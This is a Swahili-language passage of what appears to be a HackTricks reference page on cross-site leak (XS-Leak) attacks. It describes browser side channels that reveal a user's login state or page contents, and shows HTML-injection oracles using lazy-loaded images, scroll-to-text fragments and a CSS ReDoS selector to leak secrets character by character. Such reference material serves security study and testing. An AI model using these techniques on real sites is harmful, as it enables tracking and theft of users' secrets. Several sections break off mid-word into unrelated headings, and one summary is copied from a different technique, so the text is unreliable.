### Mali ya CSS

* **Njia za Kuingiza**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Muhtasari:** Tambua mabadiliko katika mtindo wa wavuti yanayolingana na hali au hali ya mtumiaji.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Maombi ya wavuti yanaweza kubadilisha **mtindo wa wavuti** kulingana na hali ya mtumiaji. Faili za CSS za asili zinaweza kuingizwa kwenye ukurasa wa mshambuliaji kwa kutumia **kipengele cha kiunga cha HTML**, na **kanuni** zita**tekelezwa** kwenye ukurasa wa mshambuliaji. Ikiwa ukurasa unabadilisha kanuni hizi kwa njia ya kudumu, mshambuliaji anaweza **kugundua** tofauti hizi **kulingana na hali ya mtumiaji**.\
Kama mbinu ya kuvuja, mshambuliaji anaweza kutumia njia ya `window.getComputedStyle` kusoma mali za CSS za kipengele cha HTML maalum. Kama matokeo, mshambuliaji anaweza kusoma mali za CSS za aina yoyote ikiwa kipengele na jina la mali linaloathiriwa linajulikana.

### Historia ya CSS

* **Njia za Kuingiza**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Muhtasari:** Gund
### Kuvuja kwa X-Frame ya Nyaraka ya Yaliyomo

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Vichwa vya habari
* **Maelezo Zaidi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Muhtasari**: Katika Google Chrome, ukurasa maalum wa kosa unaonyeshwa wakati ukurasa unazuiliwa kuingizwa kwenye tovuti ya asili kutokana na vizuizi vya X-Frame-Options.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Katika Chrome, ikiwa ukurasa na kichwa cha `X-Frame-Options` kimewekwa kuwa "deny" au "same-origin" kimeingizwa kama kitu, ukurasa wa kosa unaonekana. Chrome inarudisha kitu cha nyaraka tupu (badala ya `null`) kwa mali ya `contentDocument` ya kitu hiki, tofauti na iframes au vivinjari vingine. Wadukuzi wanaweza kutumia hii kwa kugundua nyaraka tupu, na hivyo kufichua habari kuhusu hali ya mtumiaji, hasa ikiwa watengenezaji hawaweki kichwa cha X-Frame-Options kwa njia thabiti, mara nyingi wakipuuza kurasa za kosa. Ufahamu na utekelezaji thabiti wa vichwa vya usalama ni muhimu kuzuia kuvuja kama hizi.


### Ugunduzi wa Upakuaji

* **Njia za Kuingiza**: Fremu, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Vichwa vya habari
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Muhtasari**: Mshambuliaji anaweza kugundua upakuaji wa faili kwa kutumia iframes; upatikanaji endelevu wa iframe unaonyesha upakuaji wa faili uliofanikiwa.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Kichwa cha `Content-Disposition`, haswa `Content-Disposition: attachment`, kinamwagiza kivinjari kupakua yaliyomo badala ya kuonyesha kwenye mstari. Tabia hii inaweza kutumiwa kugundua ikiwa mtumiaji ana ufikiaji wa ukurasa unaosababisha upakuaji wa faili. Katika vivinjari vinavyotegemea Chromium, kuna njia kadhaa za kugundua tabia hii ya upakuaji:

1. **Ufuatiliaji wa Mstari wa Upakuaji**:
- Wakati faili inapakuliwa katika vivinjari vinavyotegemea Chromium, mstari wa upakuaji unaonekana chini ya dirisha la kivinjari.
- Kwa kufuatilia mabadiliko katika urefu wa dirisha, wadukuzi wanaweza kudhani kuonekana kwa mstari wa upakuaji, ikimaanisha kuwa upakuaji umeanzishwa.

2. **Uvunguzi wa Njia ya Upakuaji na Iframes**:
- Wakati ukurasa unasababisha upakuaji wa faili kwa kutumia kichwa cha `Content-Disposition: attachment`, haileti tukio la uendeshaji.
- Kwa kupakia yaliyomo kwenye iframe na kufuatilia matukio ya uendeshaji, inawezekana kuchunguza ikiwa kichwa cha upangaji wa yaliyomo kinasababisha upakuaji wa faili (hakuna uendeshaji) au la.

3. **Uvunguzi wa Njia ya Upakuaji bila Iframes**:
- Kama vile njia ya iframe, njia hii inahusisha kutumia `window.open` badala ya iframe.
- Kwa kufuatilia matukio ya uendeshaji katika dirisha jipya lililofunguliwa, inawezekana kugundua ikiwa upakuaji wa faili ulisababishwa (hakuna uendeshaji) au ikiwa yaliyomo yanaonyeshwa kwenye mstari (uendeshaji unatokea).

Katika hali ambapo watumiaji walioingia tu ndio wanaweza kusababisha upakuaji kama huu, njia hizi zinaweza kutumika kwa njia isiyo ya moja kwa moja kugundua hali ya uwakiki ya mtumiaji kulingana na jibu la kivinjari kwa ombi la upakuaji.

### Kuvuka Kizuizi cha Hifadhi ya HTTP Iliyogawanywa <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Njia za Kuingiza**: Pop-ups
* **Tofauti Inayoweza Kugundulika**: Wakati
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Muhtasari**: Mshambuliaji anaweza kugundua upakuaji wa faili kwa kutumia iframes; upatikanaji endelevu wa iframe unaonyesha upakuaji wa faili uliofanikiwa.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (kutoka [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Hii ndio sababu hii mbinu ni ya kuvutia: Chrome sasa ina **ugawanyaji wa hifadhi**, na ufunguo wa hifadhi ya ukurasa uliofunguliwa hivi sasa ni: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, lakini ikiwa ninafungua ukurasa wa ngrok na kutumia fetch ndani yake, ufunguo wa hifadhi utakuwa: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, ufunguo wa **hifadhi ni tofauti**, kwa hivyo hifadhi haiwezi kushirikiwa. Unaweza kupata maelezo zaidi hapa: [Kupata usalama na faragha kwa kugawanya hifadhi](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Maoni kutoka [**hapa**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Ikiwa tovuti `example.com` inajumuisha rasilimali kutoka `*.example.com/resource` basi rasilimali hiyo itakuwa na **funguo sawa za hifadhi** kama vile rasilimali ingeombwa moja kwa moja kupitia uendeshaji wa kiwango cha juu. Hii ni kwa sababu ufunguo wa hifadhi unajumuisha _eTLD+1_ ya kiwango cha juu na _eTLD+1_ ya fremu.

Kwa sababu kupata hifadhi ni haraka kuliko kupakia rasilimali, inawezekana kujaribu kubadilisha eneo la ukurasa na kufuta baada ya 20ms (kwa mfano). Ikiwa asili imebadilika baada ya kusitisha, inamaanisha kuwa rasilimali imehifadhiwa.\
Au inaweza tu **kutuma ombi la fetch kwenye ukurasa uliohifadhiwa na kupima wakati inachukua**.

### Uelekezaji wa Kuelekeza kwa Mikono <a
### Uchafuzi wa Script

* **Njia za Kuingiza**: Vipengele vya HTML (script)
* **Tofauti Inayoweza Kugundulika**: Yaliyomo kwenye Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Muhtasari:** Inawezekana **kubadilisha kazi zilizojengwa ndani** na kusoma hoja zao hata kutoka kwenye **script ya asili ya asili** (ambayo haiwezi kusomwa moja kwa moja), hii inaweza **kuvuja habari muhimu**.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Wafanyakazi wa Huduma <a href="#service-workers" id="service-workers"></a>

* **Njia za Kuingiza**: Pop-ups
* **Tofauti Inayoweza Kugundulika**: Yaliyomo kwenye Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Muhtasari:** Pima wakati wa utekelezaji wa wavuti kwa kutumia wafanyakazi wa huduma.
* **Mfano wa Kanuni**:

Katika hali iliyotolewa, mshambuliaji anachukua hatua ya kujiandikisha **mfanyakazi wa huduma** ndani ya moja ya uwanja wao, haswa "attacker.com". Kisha, mshambuliaji hufungua dirisha jipya kwenye wavuti ya lengo kutoka kwenye hati kuu na kuagiza **mfanyakazi wa huduma** kuanza timer. Wakati dirisha jipya linapoanza kupakia, mshambuliaji anaviga kumbukumbu iliyopatikana hatua ya awali kwenye ukurasa uliosimamiwa na **mfanyakazi wa huduma**.

Baada ya kuwasili kwa ombi lililoanzishwa hatua iliyotangulia, **mfanyakazi wa huduma** hujibu na msimbo wa hali ya **204 (Hakuna Yaliyomo)**, ikimaliza kwa ufanisi mchakato wa urambazaji. Wakati huu, **mfanyakazi wa huduma** hukamata kipimo kutoka kwa timer iliyoanzishwa mapema katika hatua ya pili. Kipimo hiki kinategemea muda wa JavaScript unaosababisha kucheleweshwa katika mchakato wa urambazaji.

{% hint style="warning" %}
Katika utekelezaji wa wakati, inawezekana **kuondoa** **factors ya mtandao** ili kupata **vipimo sahihi zaidi**. Kwa mfano, kwa kupakia rasilimali zinazotumiwa na ukurasa kabla ya kupakia.
{% endhint %}

### Uchukuzi wa Wakati

* **Njia za Kuingiza**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Wakati (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Msimbo wa Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Muhtasari:** Tumia [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kupima muda unachukua kufanya ombi. Vifaa vingine vya saa vinaweza kutumika.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Uchukuzi wa Wakati kati ya Madirisha

* **Njia za Kuingiza**: Pop-ups
* **Tofauti Inayoweza Kugundulika**: Wakati (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Msimbo wa Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Muhtasari:** Tumia [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kupima muda unachukua kufanya ombi kwa kutumia `window.open`. Vifaa vingine vya saa vinaweza kutumika.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mchakato wa kazi zinazotumia zana za jamii za **juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Kwa Kutumia HTML au Uingizaji wa Re

Hapa unaweza kupata mbinu za kuchukua habari kutoka kwa HTML ya asili ya asili ya asili **kwa kuingiza yaliyomo ya HTML**. Mbinu hizi ni muhimu katika kesi ambapo kwa sababu yoyote unaweza **kuingiza HTML lakini huwezi kuingiza msimbo wa JS**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Upakiaji wa Picha Usio na Kazi

Ikiwa unahitaji **kuchukua yaliyomo** na unaweza **kuongeza HTML kabla ya siri**, unapaswa kuangalia **mbinu za kawaida za dangling markup**.\
Walakini, ikiwa kwa sababu yoyote **LAZIMA** ufanye hivyo **herufi kwa herufi** (labda mawasiliano ni kupitia hiti ya cache) unaweza kutumia hila hii.

**Picha** katika HTML ina sifa ya "**upakiaji**" ambayo thamani yake inaweza kuwa "**uvivu**". Katika kesi hiyo, picha itapakia wakati inapoonekana na sio wakati ukurasa unapakia:
```html
<img src=/something loading=lazy >
```
Kwa hiyo, unaweza **kuongeza herufi nyingi za taka** (Kwa mfano **maelfu ya "W"**) ili **kujaza ukurasa wa wavuti kabla ya siri au kuongeza kitu kama** `<br><canvas height="1850px"></canvas><br>.`\
Kisha, kama kwa mfano **uingizaji wetu unaonekana kabla ya bendera**, **picha** ita**pakia**, lakini ikiwa inaonekana **baada ya** bendera, bendera + taka itazuia **kupakia** (utahitaji kucheza na kiasi cha taka ya kuweka). Hii ndio iliyotokea katika [**makala hii**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Chaguo lingine litakuwa kutumia **scroll-to-text-fragment** ikiwa inaruhusiwa:

#### Scroll-to-text-fragment

Walakini, unafanya **boti kufikia ukurasa** na kitu kama hicho
```
#:~:text=SECR
```
Kwa hivyo ukurasa wa wavuti utakuwa kama: **`https://victim.com/post.html#:~:text=SECR`**

Ambapo post.html ina vishale vya mshambuliaji na picha ya mzigo wa uvivu na kisha siri ya bot inaongezwa.

Kitu hiki kitafanya boti kupata maandishi yoyote kwenye ukurasa ambao una maandishi `SECR`. Kwa kuwa maandishi hayo ni siri na iko **chini ya picha**, **picha itapakia tu ikiwa siri iliyoguiliwa ni sahihi**. Kwa hivyo hapo ndipo unapopata orakali yako ya **kuvuja siri herufi kwa herufi**.

Baadhi ya mifano ya nambari ya kuchexploit hii: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Ucheleweshaji wa Picha ya Mzigo wa Uvivu kulingana na Wakati

Ikiwa **haiwezekani kupakia picha ya nje** ambayo inaweza kuonyesha mshambuliaji kuwa picha imepakia, chaguo lingine litakuwa kujaribu **kudhani herufi mara kadhaa na kupima hilo**. Ikiwa picha imepakia, maombi yote yatachukua muda mrefu kuliko ikiwa picha haijapakia. Hii ndio iliyotumiwa katika [**ufumbuzi wa andiko hili**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **imefupishwa hapa:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Ikiwa `jQuery(location.hash)` inatumika, ni rahisi kugundua kwa kutumia wakati i**ki kuna maudhui ya HTML**, hii ni kwa sababu ikiwa mteua `main[id='site-main']` haifanani, haitahitaji kuangalia sehemu zingine za **wateua**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Uingizaji wa CSS

{% content-ref url="xs-search/css-injection/" %}
[uingizaji-wa-css](xs-search/css-injection/)
{% endcontent-ref %}

## Ulinzi

Kuna njia za kupunguza madhara zilizopendekezwa katika [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) pia katika kila sehemu ya wiki [https://xsleaks.dev/](https://xsleaks.dev/). Angalia hapo kwa maelezo zaidi juu ya jinsi ya kulinda dhidi ya mbinu hizi.

## Marejeo

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mchakato wa kazi ulioendeshwa na zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
